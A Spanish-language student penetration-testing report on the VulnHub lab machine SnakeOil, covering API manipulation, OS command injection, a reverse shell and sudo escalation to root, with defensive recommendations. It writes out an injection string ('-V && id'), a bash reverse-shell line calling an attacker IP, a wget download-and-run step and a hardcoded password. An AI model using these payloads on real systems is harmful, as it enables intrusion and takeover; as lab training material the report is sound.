PR01 - De la teoria a la practica: Walkthrough en accion

Introducción

Marzo 2026 Alan Gilberto Sánchez Zavala (177263)

El presente reporte documenta el proceso de evaluación de seguridad y pruebas de penetración realizado sobre el servidor SnakeOil, un entorno controlado de VulnHub. El objetivo principal de esta actividad es identificar y explotar vulnerabilidades críticas en una aplicación web basada en el framework Flask, con el fin de obtener acceso inicial al sistema y, posteriormente, escalar privilegios hasta el nivel de superusuario (root).


La metodología aplicada sigue el estándar de ejecución de pruebas de penetración (PTES), abarcando desde la enumeración de servicios hasta la post-explotación, demostrando el impacto que tienen las malas prácticas de desarrollo y las configuraciones débiles en la seguridad de la infraestructura.

2. Desarrollo (Metodología Técnica)

Fase I: Explotación de la API Web

Tras la fase de reconocimiento inicial, se identificó una API REST en el puerto 8080. Se utilizó Burp Suite para interceptar y manipular el tráfico.

  • Manipulación de Métodos: Se cambió el método de petición de GET a POST en los endpoints /registration y /login. Esto permitió el envío de objetos JSON para la creación de un usuario y la obtención de un JSON Web Token (JWT).
  • Obtención de Secretos: Utilizando el access_token generado, se realizó una petición autenticada al recurso /secret, el cual devolvió una secret_key necesaria para interactuar con funciones administrativas de la aplicación.

Fase II: Ejecución Remota de Comandos (RCE)

El análisis del endpoint /run reveló una vulnerabilidad de Inyección de Comandos OS.

  • Validación de RCE: Se inyectó la cadena -V && id. El uso del operador lógico && permitió ejecutar comandos adicionales en el sistema operativo subyacente. La respuesta confirmó que la aplicación corría bajo el contexto del usuario patrick.
  • Preparación del Vector de Ataque: Se diseñó un script en Bash (shell.sh) con un payload de Reverse Shell: 
    bash -i >& /dev/tcp/192.168.56.101/5555 0>&1
  • Transferencia y Ejecución: Se levantó un servidor temporal con Python HTTP Server en Kali Linux. Mediante wget, el servidor víctima descargó el script, se le otorgaron permisos de ejecución (chmod +x) y se ejecutó, devolviendo una conexión a un oyente de Netcat.

Fase III: Post-Explotación y Escalada de Privilegios

Una vez obtenido el acceso como el usuario patrick, se procedió a la auditoría interna del sistema.

  • Análisis de Código Fuente: Al inspeccionar el archivo app.py en el directorio de la aplicación Flask, se identificó una contraseña harcodeada en la configuración: NOreasonableDOUBTthisPASSWORDisGOOD.
  • Abuso de Sudoers: El comando sudo -l reveló que el usuario poseía privilegios para ejecutar cualquier comando como root (ALL : ALL) ALL.
  • Estabilización de TTY: Debido a que la shell de Netcat no era interactiva, se utilizó el módulo pty de Python para invocar una terminal real: 
    python3 -c 'import pty; pty.spawn("/bin/bash")'
  • Elevación de Privilegios: Con una terminal estable, se ejecutó sudo /bin/bash utilizando la contraseña encontrada previamente, logrando el compromiso total del sistema.

Conclusión

La auditoría de la máquina SnakeOil ha sido exitosa, logrando el compromiso total (Root) mediante una cadena de vulnerabilidades críticas. Los hallazgos principales incluyen:


  • Validación de entrada deficiente: La falta de sanitización en el parámetro url permitió una inyección de comandos directa.
  • Seguridad por oscuridad: El uso de una secret_key estática para proteger funciones críticas no fue suficiente ante un análisis dinámico.
  • Malas prácticas de desarrollo: El almacenamiento de credenciales en texto claro dentro del código fuente facilitó la escalada de privilegios.
  • Configuraciones de Sudo inseguras: Otorgar permisos totales a un usuario limitado permitió que un compromiso en la capa web se convirtiera en un compromiso total de la infraestructura.

Como recomendación, se sugiere implementar una lista blanca de comandos permitidos, cifrar secretos mediante variables de entorno y aplicar el Principio de Menor Privilegio en la configuración de sudoers.
